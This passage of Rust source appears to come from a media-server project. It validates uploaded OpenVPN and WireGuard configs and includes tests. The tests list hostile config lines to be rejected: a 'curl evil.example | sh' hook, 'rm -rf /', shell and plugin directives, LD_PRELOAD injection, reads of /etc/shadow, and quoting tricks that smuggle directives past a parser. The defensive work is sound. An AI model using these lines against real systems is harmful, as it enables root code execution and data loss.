                "Line {n} is longer than OpenVPN allows ({OPENVPN_MAX_LINE} characters). Upload the .ovpn file your VPN provider gave you."
            ));
        }
        if let Some((close, _)) = &block {
            // OpenVPN ends the block at the first line that starts with the close tag
            // (case-sensitive, after leading whitespace) and ignores the rest of that line.
            if let Some(rest) = raw
                .trim_start_matches(c_isspace)
                .strip_prefix(close.as_str())
            {
                if !rest.trim_matches(c_isspace).is_empty() {
                    return Err(format!(
                        "Line {n} has text after {close}. Remove it and upload the file again."
                    ));
                }
                block = None;
            }
            continue;
        }
        let tokens = tokenize_openvpn(raw).map_err(|e| format!("Line {n} {e}."))?;
        let Some(first) = tokens.first() else {
            continue;
        };
        // OpenVPN strips one leading `--` before it looks for `<tag>`.
        let tag_token = match first.strip_prefix("--") {
            Some(rest) if first.len() >= 3 => rest,
            _ => first.as_str(),
        };
        if tag_token.starts_with('<') {
            let tag = tag_token
                .strip_prefix('<')
                .and_then(|t| t.strip_suffix('>'))
                .unwrap_or_default();
            if tokens.len() > 1 || tag.is_empty() || tag.starts_with('/') {
                return Err(format!("Line {n} is not a valid OpenVPN block tag."));
            }
            if !OPENVPN_INLINE.contains(&tag) {
                return Err(match tag.to_ascii_lowercase().as_str() {
                    "auth-user-pass" => "This OpenVPN file contains a username and password block. Remove it and type them into the form instead.".to_string(),
                    "connection" => "This OpenVPN file uses <connection> blocks, which PopcornStash does not support. Use a file with plain remote lines.".to_string(),
                    _ => format!("Line {n}: the <{tag}> block is not supported. Only certificate and key blocks are allowed."),
                });
            }
            block = Some((format!("</{tag}>"), n));
            continue;
        }
        let directive = first.trim_start_matches("--").to_ascii_lowercase();
        let args: Vec<&str> = tokens[1..].iter().map(String::as_str).collect();
        check_openvpn_directive(&directive, &args, n)?;
        match directive.as_str() {
            "client" => client = true,
            "tls-client" => tls_client = true,
            "pull" => pull = true,
            "remote" => {
                let host = args
                    .first()
                    .ok_or_else(|| format!("The remote on line {n} has no server address."))?;
                let host = host.trim().to_ascii_lowercase();
                if host.parse::<std::net::IpAddr>().is_err() && !nordvpn::is_hostname(&host) {
                    return Err(format!("The remote on line {n} is not a server address."));
                }
                if let Some(port) = args.get(1)
                    && !port.parse::<u16>().is_ok_and(|p| p > 0)
                {
                    return Err(format!("The remote on line {n} has an invalid port."));
                }
                remotes.push(host);
            }
            "verify-x509-name" => {
                if let Some(name) = args.first() {
                    x509_names.push(
                        name.trim_start_matches("CN=")
                            .trim_start_matches("cn=")
                            .to_ascii_lowercase(),
                    );
                }
            }
            _ => {}
        }
    }

    if let Some((close, line)) = block {
        return Err(format!(
            "The block that starts on line {line} is never closed with {close}."
        ));
    }
    if !client && !(tls_client && pull) {
        return Err("This file is missing the client line. Upload the client .ovpn file from your VPN provider.".into());
    }
    let remote_host = remotes.first().cloned().ok_or(
        "This OpenVPN file has no remote server. Upload the .ovpn file for a specific server.",
    )?;
    let nordvpn_host = remotes
        .iter()
        .chain(x509_names.iter())
        .find(|h| h.ends_with(".nordvpn.com") && nordvpn::is_hostname(h))
        .cloned();
    Ok(OpenvpnSummary {
        remote_host,
        nordvpn_host,
    })
}

fn check_openvpn_directive(directive: &str, args: &[&str], n: usize) -> Result<(), String> {
    if OPENVPN_BLOCKED.contains(&directive)
        || directive.starts_with("management")
        || directive.starts_with("pkcs11")
    {
        return Err(format!(
            "This OpenVPN file runs programs or touches files on the server ({directive} on line {n}). PopcornStash does not allow that. Remove the line and upload the file again."
        ));
    }
    match directive {
        "auth-user-pass" if !args.is_empty() => Err(format!(
            "Line {n} points auth-user-pass at a file. Remove the file name; PopcornStash supplies the username and password from the form."
        )),
        "server" | "server-bridge" | "tls-server" => Err(
            "This is a server configuration. Upload the client .ovpn file from your VPN provider.".to_string(),
        ),
        "mode" if args.first().is_some_and(|m| m.eq_ignore_ascii_case("server")) => Err(
            "This is a server configuration. Upload the client .ovpn file from your VPN provider.".to_string(),
        ),
        d if OPENVPN_FILE_ARGS.contains(&d) => match args.first() {
            Some(arg) if !arg.eq_ignore_ascii_case("[inline]") => Err(format!(
                "Line {n} refers to another file ({arg}). Use a single .ovpn file with the certificates and keys inline."
            )),
            _ => Ok(()),
        },
        "http-proxy" | "socks-proxy" if proxy_auth_file(args) => Err(format!(
            "Line {n} points {directive} at a password file. PopcornStash does not allow that."
        )),
        // `setenv opt <directive>` makes OpenVPN run the directive; check it too.
        "setenv" | "setenv-safe" if args.first().is_some_and(|a| a.eq_ignore_ascii_case("opt")) => match args.get(1) {
            Some(inner) => check_openvpn_directive(&inner.trim_start_matches("--").to_ascii_lowercase(), &args[2..], n),
            None => Ok(()),
        },
        // Plain `setenv` variables reach the root-run hook script unchanged
        // (`setenv-safe` prefixes them with OPENVPN_ and stays allowed).
        "setenv" => match args.first() {
            Some(name) if !safe_setenv_name(name) => {
                let name: String = name.chars().filter(|c| !c.is_control()).take(40).collect();
                Err(format!(
                    "Line {n} sets {name} for programs on the server. PopcornStash does not allow that. Remove the line and upload the file again."
                ))
            }
            _ => Ok(()),
        },
        _ => Ok(()),
    }
}

/// `http-proxy host port authfile` / `socks-proxy host port authfile` read credentials from a file.
fn proxy_auth_file(args: &[&str]) -> bool {
    args.get(2)
        .is_some_and(|a| !matches!(a.to_ascii_lowercase().as_str(), "auto" | "auto-nct"))
}

/// `setenv` names that are safe to hand to scripts. Anything else (`LD_PRELOAD`, `PATH`,
/// `GLIBC_TUNABLES`, ...) would reach the root-run hook script, so it is refused.
fn safe_setenv_name(name: &str) -> bool {
    name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        && (name.starts_with("UV_")
            || name.starts_with("IV_")
            || matches!(
                name,
                "CLIENT_CERT"
                    | "FORWARD_COMPATIBLE"
                    | "PUSH_PEER_INFO"
                    | "SERVER_POLL_TIMEOUT"
                    | "REMOTE_RANDOM_HOSTNAME"
                    | "ALLOW_PASSWORD_SAVE"
                    | "FRIENDLY_NAME"
            ))
}

/// C `isspace()` in the C locale, plus NUL: OpenVPN's `space()`.
fn c_isspace(c: char) -> bool {
    matches!(c, ' ' | '\t' | '\n' | '\x0b' | '\x0c' | '\r' | '\0')
}

/// Split one OpenVPN config line exactly the way OpenVPN 2.6's `parse_line()` does:
/// ASCII whitespace separates tokens; `#` or `;` at the start of a token begins a comment
/// (even after a backslash); a backslash escapes `\`, `"` or whitespace outside single
/// quotes; double quotes group, single quotes group literally; and a closing quote ends
/// the token (`"plugin"/x.so` is two tokens). Lines OpenVPN refuses or drops (bad
/// escapes, open quotes) are refused, so the check never sees less than OpenVPN does.
fn tokenize_openvpn(line: &str) -> Result<Vec<String>, &'static str> {
    #[derive(Clone, Copy, PartialEq)]
    enum State {
        Initial,
        Unquoted,
        Quoted,
        SingleQuoted,
    }
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut state = State::Initial;
    let mut backslash = false;
    // OpenVPN sees the line with its newline (from fgets) and the terminating NUL.
    for c in line.chars().chain(['\n', '\0']) {
        if !backslash && c == '\\' && state != State::SingleQuoted {
            backslash = true;
            continue;
        }
        let mut out = None;
        let mut done = false;
        match state {
            State::Initial => {
                if !c_isspace(c) {
                    if c == ';' || c == '#' {
                        break;
                    }
                    if !backslash && c == '"' {
                        state = State::Quoted;
                    } else if !backslash && c == '\'' {
                        state = State::SingleQuoted;
                    } else {
                        out = Some(c);
                        state = State::Unquoted;
                    }
                }
            }
            State::Unquoted => {
                if !backslash && c_isspace(c) {
                    done = true;
                } else {
                    out = Some(c);
                }
            }
            State::Quoted => {
                if !backslash && c == '"' {
                    done = true;
                } else {
                    out = Some(c);
                }
            }
            State::SingleQuoted => {
                if c == '\'' {
                    done = true;
                } else {
                    out = Some(c);
                }
            }
        }
        if done {
            tokens.push(std::mem::take(&mut current));
            state = State::Initial;
        }
        if backslash
            && let Some(o) = out
            && !(o == '\\' || o == '"' || c_isspace(o))
        {
            return Err("has a backslash OpenVPN does not accept");
        }
        backslash = false;
        // NUL ends the line; it is never part of a token.
        if let Some(o) = out.filter(|&o| o != '\0') {
            current.push(o);
        }
    }
    match state {
        State::Quoted | State::SingleQuoted => return Err("has an unterminated quote"),
        State::Unquoted => return Err("has an unfinished escape"),
        State::Initial => {}
    }
    if tokens.iter().any(|t| t.contains('\n')) {
        return Err("ends with a backslash");
    }
    Ok(tokens)
}

#[cfg(test)]
mod tests {
    use std::os::unix::fs::PermissionsExt;
    use std::path::Path;

    use axum::body::Body;
    use axum::http::{Method, StatusCode};
    use axum::routing::get;
    use stash_core::models::Role;
    use tower::ServiceExt;
    use url::Url;

    use super::*;
    use crate::auth::Scope;
    use crate::nordvpn::tests::{
        PRIVATE_KEY, SERVER_KEY, credentials_fixture, recommendation_fixture,
    };

    const PEER_KEY: &str = "SyzWv/OB1omrgW0JCwqBZcZ0QIdr4zU/LaeMiB/V3XE=";

    fn good_wireguard() -> String {
        format!(
            "# Example config\n[Interface]\nPrivateKey = {PRIVATE_KEY}\nAddress = 10.2.0.2/32, fd00::2/128\nDNS = 10.2.0.1\n\n\
             [Peer]\nPublicKey = {PEER_KEY}\nAllowedIPs = 0.0.0.0/0, ::/0\nEndpoint = nl-12.vpn.example.com:51820\nPersistentKeepalive = 25\n"
        )
    }

    const NORD_OVPN: &str = "client\ndev tun\nproto udp\nremote 185.153.177.12 1194\nresolv-retry infinite\nremote-random\nnobind\n\
tun-mtu 1500\ntun-mtu-extra 32\nmssfix 1450\npersist-key\npersist-tun\nping 15\nping-restart 0\nping-timer-rem\nreneg-sec 0\n\
comp-lzo no\nverify-x509-name CN=nl812.nordvpn.com\n\nremote-cert-tls server\n\nauth-user-pass\nverb 3\npull\nfast-io\n\
cipher AES-256-CBC\nauth SHA512\n<ca>\n-----BEGIN CERTIFICATE-----\nMIIFCjCCAvKgAwIBAgIBATANBgkqhkiG9w0BAQ0FADA5MQswCQYDVQQGEwJQQTEQ\n\
-----END CERTIFICATE-----\n</ca>\nkey-direction 1\n<tls-auth>\n#\n# 2048 bit OpenVPN static key\n#\n-----BEGIN OpenVPN Static key V1-----\n\
e685bdaf659a25a200e2b9e39e51ff03\n-----END OpenVPN Static key V1-----\n</tls-auth>\n";

    fn generic_ovpn() -> String {
        "client\ndev tun\nproto udp\nremote vpn.example.net 1194\nsetenv CLIENT_CERT 0\n<ca>\nAAAA\n</ca>\n".to_string()
    }

    #[test]
    fn wireguard_good_file() {
        let summary = validate_wireguard(&good_wireguard()).unwrap();
        assert_eq!(summary.endpoint_host, "nl-12.vpn.example.com");
        assert_eq!(summary.peers, 1);
        let v6 = good_wireguard().replace("nl-12.vpn.example.com:51820", "[2001:db8::1]:51820");
        assert_eq!(
            validate_wireguard(&v6).unwrap().endpoint_host,
            "2001:db8::1"
        );
        let crlf = good_wireguard().replace('\n', "\r\n");
        assert!(validate_wireguard(&crlf).is_ok());
    }

    #[test]
    fn wireguard_rejects_commands_and_routing() {
        for (line, word) in [
            ("PostUp = curl https://evil.example | sh", "runs commands"),
            ("PreUp = /bin/sh -c id", "runs commands"),
            ("postdown = rm -rf /", "runs commands"),
            ("PreDown=iptables -F", "runs commands"),
            ("SaveConfig = true", "routing"),
            ("Table = off", "routing"),
        ] {
            let text =
                good_wireguard().replace("DNS = 10.2.0.1\n", &format!("DNS = 10.2.0.1\n{line}\n"));
            let err = validate_wireguard(&text).unwrap_err();
            assert!(err.contains(word), "{line}: {err}");
        }
    }

    /// Files the supervisor would refuse must be refused at upload, not saved as configured.
    #[test]
    fn wireguard_matches_what_the_supervisor_accepts() {
        for text in [
            good_wireguard().replace("AllowedIPs = 0.0.0.0/0, ::/0\n", ""),
            good_wireguard().replace("DNS = 10.2.0.1\n", "DNS = 10.2.0.1\nMTU = 1000\n"),
            good_wireguard().replace("DNS = 10.2.0.1\n", "DNS = 10.2.0.1\nMTU = 65000\n"),
            good_wireguard().replace("[Peer]", "[ Peer ]"),
        ] {
            assert!(validate_wireguard(&text).is_err(), "should fail:\n{text}");
        }
        let mtu = good_wireguard().replace("DNS = 10.2.0.1\n", "DNS = 10.2.0.1\nMTU = 1420\n");
        assert!(validate_wireguard(&mtu).is_ok());
    }

    #[test]
    fn wireguard_rejects_broken_files() {
        let cases = [
            good_wireguard().replace("[Interface]\n", ""),
            good_wireguard().replace(&format!("PrivateKey = {PRIVATE_KEY}\n"), ""),
            good_wireguard().replace("Address = 10.2.0.2/32, fd00::2/128\n", ""),
            good_wireguard().replace(&format!("PublicKey = {PEER_KEY}\n"), ""),
            good_wireguard().replace("Endpoint = nl-12.vpn.example.com:51820\n", ""),
            good_wireguard().replace(
                "Endpoint = nl-12.vpn.example.com:51820",
                "Endpoint = nl-12.vpn.example.com",
            ),
            good_wireguard().replace(PRIVATE_KEY, "notakey"),
            good_wireguard().replace("10.2.0.2/32", "10.2.0.2/40"),
            format!(
                "{}\n[Interface]\nPrivateKey = {PRIVATE_KEY}\nAddress = 10.0.0.2/32\n",
                good_wireguard()
            ),
            good_wireguard().replace("[Peer]", "[Pear]"),
            good_wireguard() + "Jc = 4\n",
            good_wireguard().split("[Peer]").next().unwrap().to_string(),
            "x".repeat(WIREGUARD_MAX_BYTES + 1),
        ];
        for text in cases {
            assert!(validate_wireguard(&text).is_err(), "should fail:\n{text}");
        }
    }

    #[test]
    fn openvpn_good_files() {
        let summary = validate_openvpn(NORD_OVPN).unwrap();
        assert_eq!(summary.remote_host, "185.153.177.12");
        assert_eq!(summary.nordvpn_host.as_deref(), Some("nl812.nordvpn.com"));
        let summary = validate_openvpn(&generic_ovpn()).unwrap();
        assert_eq!(summary.remote_host, "vpn.example.net");
        assert!(summary.nordvpn_host.is_none());
        // tls-client + pull is the long form of client; comments and inline [inline] are fine.
        let long = "tls-client\npull\n# up /bin/sh\n; script-security 2\nremote 1.2.3.4 1194 udp\ntls-auth [inline] 1\n";
        assert!(validate_openvpn(long).is_ok());
    }

    #[test]
    fn openvpn_rejects_code_and_files() {
        let malicious = [
            "up /bin/sh",
            "script-security 2",
            "plugin /usr/lib/openvpn/plugins/openvpn-plugin-down-root.so",
            "--up /tmp/x.sh",
            "\"up\" /bin/sh",
            "u\\p /bin/sh",
            "route-up '/bin/sh -c id'",
            "down /bin/true",
            "management 0.0.0.0 7505",
            "management-client-auth",
            "log /config/popcornstash.db",
            "status /etc/passwd",
            "writepid /config/x",
            "daemon",
            "chroot /",
            "cd /",
            "config /etc/openvpn/other.conf",
            "auth-user-pass /etc/shadow",
            "askpass",
            "tls-verify /bin/sh",
            "learn-address /bin/sh",
            "ipchange /bin/sh",
            "iproute /bin/sh",
            "engine dynamic",
            "pkcs11-providers /lib/evil.so",
            "setenv opt up /bin/sh",
            "setenv-safe opt script-security 2",
            "ca /etc/ssl/certs/ca.pem",
            "tls-auth ta.key 1",
            "UP /bin/sh",
            "dns-updown /bin/sh",
            "genkey secret /config/popcornstash.db",
            "socks-proxy 127.0.0.1 1080 /etc/shadow",
        ];
        for line in malicious {
            let text = format!("client\nremote vpn.example.net 1194\n{line}\n");
            assert!(validate_openvpn(&text).is_err(), "should reject {line:?}");
        }
        let blocks = [
            "client\nremote a.example 1194\n<connection>\nremote b.example\nup /bin/sh\n</connection>\n",
            "client\nremote a.example 1194\n<auth-user-pass>\nu\np\n</auth-user-pass>\n",
            "client\nremote a.example 1194\n<ca>\nAAAA\n",
            "remote a.example 1194\n",
            "client\ndev tun\n",
            "client\nserver 10.8.0.0 255.255.255.0\nremote a.example\n",
            "client\nremote a.example 99999\n",
            "client\nremote \"unterminated\n",
        ];
        for text in blocks {
            assert!(validate_openvpn(text).is_err(), "should reject:\n{text}");
        }
        // Plain setenv stays allowed.
        assert!(
            validate_openvpn("client\nremote a.example 1194\nsetenv opt block-outside-dns\n")
                .is_ok()
        );
    }

    /// Lines OpenVPN 2.6 parses as a directive although a naive reader sees something
    /// harmless. Each one would run as root in the supervisor.
    #[test]
    fn openvpn_parser_differentials_are_rejected() {
        let cert = "<ca>\nMIIFCjCCAvKgAwIBAgIBATANBgkqhkiG9w0BAQ0FADA5MQswCQYDVQQGEwJQQTEQ\n";
        let cases = [
            // A closing quote ends the token: OpenVPN reads `plugin /tmp/x.so`.
            "client\nremote a.example 1194\n\"plugin\"/tmp/x.so\n".to_string(),
            "client\nremote a.example 1194\n'route-up'/bin/true\n".to_string(),
            "client\nremote a.example 1194\n\"ipchange\"'/bin/sh -c id'\n".to_string(),
            // OpenVPN ends an inline block at a line that starts with the close tag.
            format!(
                "client\nremote a.example 1194\n{cert}</ca>junk\nplugin /tmp/x.so\n{cert}</ca>\n"
            ),
            // OpenVPN reads inline blocks 255 bytes at a time, so the tail of a long line
            // can close the block.
            format!(
                "client\nremote a.example 1194\n{cert}{}</ca>\nplugin /tmp/x.so\n{cert}</ca>\n",
                "A".repeat(255)
            ),
            // A long comment line: OpenVPN refuses it, so refuse it here with a sentence.
            format!(
                "client\nremote a.example 1194\n#{}plugin /tmp/x.so\n",
                "0".repeat(255)
            ),
            // Environment for the root-run hook script.
            "client\nremote a.example 1194\nsetenv LD_PRELOAD /stash/Inbox/x.so\n".to_string(),
            "client\nremote a.example 1194\nsetenv PATH /stash/Inbox\n".to_string(),
            "client\nremote a.example 1194\nsetenv GLIBC_TUNABLES x\n".to_string(),
            // `--<ca>` opens a block in OpenVPN (it strips one leading `--`).
            format!(
                "client\nremote a.example 1194\n--<ca>\nAAAA\n</ca>junk\nplugin /x.so\n{cert}</ca>\n"
            ),
        ];
        for text in cases {
            assert!(validate_openvpn(&text).is_err(), "should reject:\n{text}");
        }
        // Common provider lines stay allowed.
        for line in [
            "setenv CLIENT_CERT 0",
            "setenv FORWARD_COMPATIBLE 1",
            "setenv UV_IPV6 yes",
            "setenv PUSH_PEER_INFO",
            "setenv opt block-outside-dns",
            "setenv-safe FRIENDLY_NAME home",
        ] {
            let text = format!("client\nremote a.example 1194\n{line}\n");
            assert!(validate_openvpn(&text).is_ok(), "should allow {line:?}");
        }
    }

    #[test]
    fn tokenizer_matches_openvpn() {
        assert_eq!(
            tokenize_openvpn("  remote  host 1194 # comment").unwrap(),
            ["remote", "host", "1194"]
        );
        assert_eq!(
            tokenize_openvpn("a \"b c\" 'd e' f\\ g").unwrap(),
            ["a", "b c", "d e", "f g"]
        );
        assert_eq!(
            tokenize_openvpn("verb 3;still-token").unwrap(),
            ["verb", "3;still-token"]
        );
        assert!(tokenize_openvpn("; comment").unwrap().is_empty());
        assert!(tokenize_openvpn("x \"open").is_err());
        // Quotes end a token, as in OpenVPN's parse_line().
        assert_eq!(
            tokenize_openvpn("\"plugin\"/x.so").unwrap(),
            ["plugin", "/x.so"]
        );
        assert_eq!(tokenize_openvpn("'a'\"b\"c").unwrap(), ["a", "b", "c"]);
        // A quote inside an unquoted token is an ordinary character.
        assert_eq!(tokenize_openvpn("up\"x\"").unwrap(), ["up\"x\""]);
        // `\#` still starts a comment; bad escapes make OpenVPN drop the line, so refuse it.
        assert!(tokenize_openvpn("\\# up /x").unwrap().is_empty());
        assert!(tokenize_openvpn("u\\p /x").is_err());
    }

    fn test_config(dir: &Path) -> Config {
        Config::for_tests(&dir.join("stash"), &dir.join("config"))
    }

    fn mode(path: &Path) -> u32 {
        std::fs::metadata(path).unwrap().permissions().mode() & 0o777
    }

    /// Every byte under `dir`, to prove a secret never reached the disk.
    fn all_bytes(dir: &Path) -> Vec<u8> {
        let mut out = Vec::new();
        let mut stack = vec![dir.to_path_buf()];
        while let Some(path) = stack.pop() {
            for entry in std::fs::read_dir(&path).unwrap().flatten() {
                let p = entry.path();
                if p.is_dir() {
                    stack.push(p);
                } else {
                    out.extend(std::fs::read(&p).unwrap_or_default());
                }
            }
        }
        out
    }

    fn contains(haystack: &[u8], needle: &str) -> bool {
        haystack
            .windows(needle.len())
            .any(|w| w == needle.as_bytes())
    }

    const ACCESS_TOKEN: &str = "e9f2abd0b2b5c1f3a6d7e8f90123456789abcdef0123456789abcdef01234567";

    async fn fake_nordvpn() -> Url {
        use axum::extract::RawQuery;
        use axum::http::HeaderMap;
        use base64::Engine as _;
        let expected = format!(
            "Basic {}",
            base64::engine::general_purpose::STANDARD.encode(format!("token:{ACCESS_TOKEN}"))
        );
        let app = Router::new()
            .route(
                "/v1/users/services/credentials",
                get(move |headers: HeaderMap| {
                    let expected = expected.clone();
                    async move {
                        if headers.get("authorization").and_then(|v| v.to_str().ok())
                            == Some(expected.as_str())
                        {
                            (StatusCode::OK, credentials_fixture())
                        } else {
                            (
                                StatusCode::UNAUTHORIZED,
                                "{\"errors\":{\"message\":\"Unauthorized\"}}".to_string(),
                            )
                        }
                    }
                }),
            )
            .route(
                "/v1/servers/recommendations",
                get(|RawQuery(query): RawQuery| async move {
                    let pairs: Vec<(String, String)> =
                        url::form_urlencoded::parse(query.unwrap_or_default().as_bytes())
                            .into_owned()
                            .collect();
                    let has = |k: &str, v: &str| pairs.iter().any(|(a, b)| a == k && b == v);
                    assert!(has("limit", "1"));
                    if has("filters[country_id]", "999") {
                        return "[]".to_string();
                    }
                    assert!(has("filters[country_id]", "153"));
                    recommendation_fixture()
                }),
            )
            .route(
                "/configs/files/ovpn_udp/servers/nl812.nordvpn.com.udp.ovpn",
                get(|| async { NORD_OVPN }),
            );
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
        Url::parse(&format!("http://{addr}/")).unwrap()
    }

    fn nord_client(base: &Url) -> NordVpnClient {
        NordVpnClient::with_base_urls(
            reqwest::Client::builder().no_proxy().build().unwrap(),
            base.clone(),
            base.clone(),
        )
    }

    #[tokio::test]
    async fn nordvpn_token_flow_wireguard_end_to_end() {
        let dir = tempfile::tempdir().unwrap();
        let config = test_config(dir.path());
        crate::torrentd_client::TorrentdClient::ensure_internal_token(&config)
            .await
            .unwrap();
        let base = fake_nordvpn().await;
        let nord = nord_client(&base);

        let setup = NordVpnSetup {
            access_token: format!("  {ACCESS_TOKEN}\n"),
            country_id: Some(153),
            protocol: Some(VpnProtocol::Wireguard),
        };
        assert!(!format!("{setup:?}").contains(ACCESS_TOKEN));
        let meta = apply_nordvpn(&config, &nord, &setup).await.unwrap();
        assert_eq!(meta.provider, VpnProvider::Nordvpn);
        assert_eq!(meta.label.as_deref(), Some("NordVPN · Netherlands · nl812"));
        assert_eq!(meta.server.as_deref(), Some("nl812.nordvpn.com"));
        assert_eq!(meta.country.as_deref(), Some("Netherlands"));

        let vpn = config.vpn_dir();
        let conf = std::fs::read_to_string(vpn.join(WIREGUARD_FILE)).unwrap();
        assert!(conf.contains(&format!("PrivateKey = {PRIVATE_KEY}")));
        assert!(conf.contains(&format!("PublicKey = {SERVER_KEY}")));
        assert!(conf.contains("Endpoint = 185.153.177.12:51820"));
        assert_eq!(mode(&vpn.join(WIREGUARD_FILE)), 0o600);
        assert_eq!(mode(&vpn.join(VPN_META_FILE)), 0o600);
        let saved: VpnMeta =
            serde_json::from_slice(&std::fs::read(vpn.join(VPN_META_FILE)).unwrap()).unwrap();
        assert_eq!(saved, meta);
        assert!(!vpn.join(OPENVPN_FILE).exists() && !vpn.join(OPENVPN_AUTH_FILE).exists());
        assert!(
            !contains(&all_bytes(dir.path()), ACCESS_TOKEN),
            "the access token reached the disk"
        );

        // Switching to OpenVPN replaces the WireGuard file.
        let setup = NordVpnSetup {
            protocol: Some(VpnProtocol::Openvpn),
            ..setup
        };
        let meta = apply_nordvpn(&config, &nord, &setup).await.unwrap();
        assert_eq!(meta.protocol, VpnProtocol::Openvpn);
        assert!(!vpn.join(WIREGUARD_FILE).exists());
        assert_eq!(
            std::fs::read_to_string(vpn.join(OPENVPN_AUTH_FILE)).unwrap(),
            "svcUser123\nsvcPass456\n"
        );
        assert_eq!(mode(&vpn.join(OPENVPN_AUTH_FILE)), 0o600);
        assert_eq!(mode(&vpn.join(OPENVPN_FILE)), 0o600);
        assert!(
            std::fs::read_to_string(vpn.join(OPENVPN_FILE))
                .unwrap()
                .contains("verify-x509-name CN=nl812.nordvpn.com")
        );
        assert!(
            !contains(&all_bytes(dir.path()), ACCESS_TOKEN),
            "the access token reached the disk"
        );
        let leftovers = std::fs::read_dir(&vpn)
            .unwrap()
            .flatten()
            .filter(|e| e.file_name().to_string_lossy().ends_with(".tmp"))
            .count();
        assert_eq!(leftovers, 0);
    }

    #[tokio::test]
    async fn nordvpn_errors_are_plain_sentences() {
        let dir = tempfile::tempdir().unwrap();
        let config = test_config(dir.path());
        let base = fake_nordvpn().await;
        let nord = nord_client(&base);
        let bad = NordVpnSetup {
            access_token: "wrong-token".into(),
            country_id: Some(153),
            protocol: None,
        };
        let err = apply_nordvpn(&config, &nord, &bad).await.unwrap_err();
        assert_eq!(err.code, ErrorCode::BadRequest);
        assert_eq!(
            err.message,
            "NordVPN did not accept that access token. Create a new one in your Nord Account and try again."
        );
        let empty = NordVpnSetup {
            access_token: "   ".into(),
            country_id: None,
            protocol: None,
        };
        assert_eq!(
            apply_nordvpn(&config, &nord, &empty)
                .await
                .unwrap_err()
                .code,
            ErrorCode::BadRequest
        );
        let no_server = NordVpnSetup {
            access_token: ACCESS_TOKEN.into(),
            country_id: Some(999),
            protocol: None,
        };
        let err = apply_nordvpn(&config, &nord, &no_server).await.unwrap_err();
        assert!(err.message.contains("no recommended server"));
        assert!(!config.vpn_dir().join(VPN_META_FILE).exists());
    }

    #[tokio::test]
    async fn uploads_write_files_and_labels() {
        let dir = tempfile::tempdir().unwrap();
        let config = test_config(dir.path());
        let vpn = config.vpn_dir();

        let meta = apply_wireguard(&config, &good_wireguard(), Some("ProtonVPN-NL-12.conf"))
            .await
            .unwrap();
        assert_eq!(meta.label.as_deref(), Some("WireGuard · ProtonVPN-NL-12"));
        assert_eq!(meta.server.as_deref(), Some("nl-12.vpn.example.com"));
        assert_eq!(mode(&vpn.join(WIREGUARD_FILE)), 0o600);

        let err = apply_wireguard(
            &config,
            &good_wireguard().replace("DNS", "PostUp = id\nDNS"),
            None,
        )
        .await
        .unwrap_err();
        assert_eq!(err.code, ErrorCode::BadRequest);
        // The rejected upload left the previous file alone.
        assert_eq!(
            std::fs::read_to_string(vpn.join(WIREGUARD_FILE)).unwrap(),
            good_wireguard()
        );

        let meta = apply_openvpn(
            &config,
            &generic_ovpn(),
            "me@example.com",
            "s3cret pass",
            None,
        )
        .await
        .unwrap();
        assert_eq!(meta.provider, VpnProvider::Openvpn);
        assert_eq!(meta.label.as_deref(), Some("OpenVPN · vpn.example.net"));
        assert!(!vpn.join(WIREGUARD_FILE).exists());
        assert_eq!(
            std::fs::read_to_string(vpn.join(OPENVPN_AUTH_FILE)).unwrap(),
            "me@example.com\ns3cret pass\n"
        );

        let meta = apply_openvpn(
            &config,
            NORD_OVPN,
            "u",
            "p",
            Some("nl812.nordvpn.com.udp.ovpn"),
        )
        .await
        .unwrap();
        assert_eq!(meta.provider, VpnProvider::Nordvpn);
        assert_eq!(meta.label.as_deref(), Some("NordVPN · nl812"));

        assert!(
            apply_openvpn(&config, NORD_OVPN, "", "p", None)
                .await
                .is_err()
        );
        assert!(
            apply_openvpn(&config, NORD_OVPN, "u", "", None)
                .await
                .is_err()
        );
        assert!(
            apply_openvpn(&config, NORD_OVPN, "u\nevil", "p", None)
                .await
                .is_err()
        );

        remove_vpn_config(&config).await.unwrap();
        for name in [
            VPN_META_FILE,
            WIREGUARD_FILE,
            OPENVPN_FILE,
            OPENVPN_AUTH_FILE,
        ] {
            assert!(!vpn.join(name).exists());
        }
        // Removing twice is fine.
        remove_vpn_config(&config).await.unwrap();
    }

    #[test]
    fn friendly_names() {
        assert_eq!(
            friendly_stem("ProtonVPN-NL-12.conf").as_deref(),
            Some("ProtonVPN-NL-12")
        );
        assert_eq!(friendly_stem("../../wg0.conf").as_deref(), Some("wg0"));
        assert_eq!(friendly_stem("").as_deref(), None);
    }

    // --- Routes (full router with an owner injected into request extensions) ---

    fn owner() -> AuthUser {
        AuthUser {
            user_id: "owner-1".into(),
            display_name: "Owner".into(),
            role: Role::Owner,
            scopes: vec![Scope::Full],
            session_id: Some("s".into()),
            token_id: None,
        }
    }

    fn member() -> AuthUser {
        AuthUser {
            role: Role::Member,
            user_id: "member-1".into(),
            ..owner()
        }
    }

    fn request(
        method: Method,
        uri: &str,
        user: Option<AuthUser>,
        content_type: &str,
        body: Body,
    ) -> axum::http::Request<Body> {
        let mut req = axum::http::Request::builder()
            .method(method)
            .uri(uri)
            .header("origin", "http://localhost:8788")
            .header("content-type", content_type)
            .body(body)
            .unwrap();
        if let Some(user) = user {
            req.extensions_mut().insert(user);
        }
        req
    }

    async fn call(app: &Router, req: axum::http::Request<Body>) -> (StatusCode, serde_json::Value) {
        let response = app.clone().oneshot(req).await.unwrap();
        let status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 1 << 20)
            .await
            .unwrap();
        (
            status,
            serde_json::from_slice(&bytes).unwrap_or(serde_json::Value::Null),
        )
    }

    fn multipart(fields: &[(&str, Option<&str>, &str)]) -> (String, Body) {
        let boundary = "popcornstash-test-boundary";
        let mut body = String::new();
        for (name, filename, value) in fields {
            body.push_str(&format!("--{boundary}\r\n"));
            match filename {
                Some(f) => body.push_str(&format!(
                    "Content-Disposition: form-data; name=\"{name}\"; filename=\"{f}\"\r\nContent-Type: application/octet-stream\r\n\r\n"
                )),
                None => body.push_str(&format!("Content-Disposition: form-data; name=\"{name}\"\r\n\r\n")),
            }
            body.push_str(value);
            body.push_str("\r\n");
        }
        body.push_str(&format!("--{boundary}--\r\n"));
        (
            format!("multipart/form-data; boundary={boundary}"),
            Body::from(body),
        )
    }

    #[tokio::test]
    async fn routes_end_to_end() {
        let dir = tempfile::tempdir().unwrap();
        let state = crate::app::test_state(dir.path()).await.unwrap();
        let vpn = state.config.vpn_dir();
